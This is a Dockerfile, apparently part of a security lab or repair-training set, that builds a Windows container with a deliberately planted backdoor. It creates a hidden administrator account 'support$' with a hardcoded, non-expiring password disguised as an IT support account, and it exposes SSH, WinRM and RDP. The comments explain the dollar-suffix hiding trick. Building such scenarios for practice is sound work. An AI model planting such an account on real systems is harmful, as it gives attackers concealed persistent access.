# syntax=docker/dockerfile:1
# meta3-win-20-hidden-admin-account — backdoor local admin account with $-suffix hidden from net user listings
FROM sysrepair/meta3-win-base:ltsc2019

SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$ErrorActionPreference='Stop';"]

# Create a local account named "support$". The trailing $ is a legacy RID-hiding trick:
#   - Older `net user` listings (and some admin GUIs) omit accounts whose name ends in '$'
#     because machine accounts conventionally use that suffix.
#   - The account is a full member of BUILTIN\Administrators.
#   - Password never expires, cannot be changed by the user.
# This is the Windows equivalent of adding a rogue UID-0 account to /etc/passwd.
RUN $pw = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force ; \
    New-LocalUser -Name 'support$' -Password $pw -FullName 'IT Support' -Description 'Break-glass support account' -PasswordNeverExpires -UserMayNotChangePassword ; \
    Add-LocalGroupMember -Group 'Administrators' -Member 'support$'


EXPOSE 22 5985 3389
CMD ["powershell", "-NoProfile", "-Command", "Start-Service sshd; Start-Service WinRM; Start-Service TermService; while ($true) { Start-Sleep 60 }"]
